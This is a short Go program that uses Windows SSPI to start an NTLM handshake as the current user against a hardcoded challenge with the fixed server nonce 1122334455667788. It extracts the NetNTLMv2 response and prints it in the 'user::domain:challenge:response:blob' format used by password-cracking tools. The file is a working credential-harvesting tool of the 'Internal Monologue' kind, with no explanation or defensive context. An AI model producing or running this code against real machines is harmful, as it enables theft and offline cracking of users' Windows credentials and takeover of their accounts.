package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"

	"github.com/alexbrainman/sspi/ntlm"
)


func main() {
	//go func() {
	cred, err := ntlm.AcquireCurrentUserCredentials()
	if err != nil { 
		fmt.Println(err)
		return
	}
	secctx, _, err := ntlm.NewClientContext(cred)
	chal, _ := base64.StdEncoding.DecodeString("TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==")
	auth, err := secctx.Update(chal)
	if err != nil { 
		fmt.Println(err)
		return
	}
	a, err := ParseAuthenticateMessage(auth)
	if err == nil {
		ind := bytes.Index(auth, a.NtlmV2Response.Response)
		if ind > 0 {
			dom := a.DomainName.String()
			if dom == "" {
				dom = a.Workstation.String()
			}
			fmt.Printf("%s::%s:1122334455667788:%s:%s\n", a.UserName.String(), dom, hex.EncodeToString(a.NtlmV2Response.Response), hex.EncodeToString(auth[ind+16:]))	
		}
		
	}
}